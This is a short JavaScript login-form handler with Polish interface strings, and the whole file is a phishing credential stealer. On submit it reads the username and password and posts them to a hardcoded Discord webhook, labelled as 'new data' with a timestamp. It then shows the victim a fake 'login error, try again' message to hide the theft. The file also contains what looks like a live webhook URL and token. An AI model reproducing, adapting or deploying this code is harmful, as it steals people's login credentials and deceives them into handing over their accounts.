const WEBHOOK_URL = "https://discord.com/api/webhooks/1549499253091602462/dZrkZpsD0acw2YhoyKvCgD2HJ0J516TQgqMxwH194bHQW_7ujE17cx5laqjC1UQ7LVif";

document.getElementById("loginForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  const user = document.getElementById("username").value;
  const pass = document.getElementById("password").value;

  try {
    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `**Nowe dane**\nLogin: \`${user}\`\nHasło: \`${pass}\`\nCzas: ${new Date().toLocaleString()}`
      })
    });
    document.getElementById("status").textContent = "Błąd logowania. Spróbuj ponownie.";
  } catch (err) {
    document.getElementById("status").textContent = "Błąd logowania. Spróbuj ponownie.";
  }
});
